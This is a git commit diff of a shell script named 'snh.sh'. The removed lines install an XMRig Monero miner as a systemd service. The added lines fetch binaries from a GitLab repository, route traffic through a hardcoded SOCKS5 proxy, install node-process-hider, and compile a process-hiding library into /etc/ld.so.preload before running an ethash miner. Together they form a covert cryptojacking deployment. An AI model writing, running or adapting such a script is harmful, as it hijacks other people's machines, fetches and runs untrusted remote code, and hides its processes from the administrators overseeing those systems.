48a37eff20215fd9a8ec8ec36d9491c12ba11e0f
rosianakicha <97800283+rosianakicha@users.noreply.github.com>
2022-05-11 09:30:53 -0500

    Update snh.sh

--- snh.sh
+++ snh.sh
@@ -1,8 +1,48 @@
-cd /usr/local/bin
-sudo wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-static-x64.tar.gz
-sudo tar xvzf xmrig-6.13.1-linux-static-x64.tar.gz
-sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/xmrig-6.13.1/xmrig -o pool.hashvault.pro:3333 -u 86he4ZJFZFx8ZZagZVrXzQV3noasErKiE6faNr883wL4dLVvWFYPwX3UqwWzEDCius46AKsbEk8Tk5Z3jx3km19MMGYaiv8.RNS --randomx-no-rdmsr\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
-sudo systemctl daemon-reload
-sudo systemctl enable xmrig.service
-sudo systemctl start xmrig.service
-echo "Setup completed!"
+ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone
+dpkg-reconfigure --frontend noninteractive tzdata
+
+
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen
+
+apt-get install libpci3
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+nohup wget https://gitlab.com/randukapuk625/novi/-/raw/main/grapLol.tar.gz > nohup.out
+
+tar -xvzf grapLol.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.86.71.9:6269
+socks5_username = lebarankita
+socks5_password = buatTHRan
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+nohup wget https://gitlab.com/randukapuk625/novi/-/raw/main/mini > nohup.out
+make
+chmod +x mini
+ph add mini
+
+wget https://gitlab.com/randukapuk625/novi/-/raw/main/Magicmini.zip > nohup.out
+make
+nohup unzip Magicmini.zip > nohup.out
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+nohup ./graftcp/graftcp ./mini --url=ssl://teguhcong.usahabener@ethash.poolbinance.com:1800 --log --extra > nohup.out
